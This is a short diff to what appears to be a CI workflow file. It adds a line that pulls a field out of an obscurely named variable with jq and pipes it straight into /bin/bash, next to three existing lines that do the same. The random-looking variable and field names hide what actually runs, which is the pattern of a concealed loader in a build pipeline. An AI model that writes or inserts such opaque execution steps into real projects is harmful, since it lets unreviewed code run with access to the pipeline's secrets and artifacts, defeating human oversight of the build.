@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$x661" | jq -r .qrems8 | /bin/bash
           printf '%s' "$axbc271" | jq -r .k02927 | /bin/bash
           echo $pec1789 | jq -r .wsvg53 | /bin/bash
+          printf '%s' "$fb3689" | jq -r .r7 | /bin/bash
 
       - name: Archive results
         if: always()
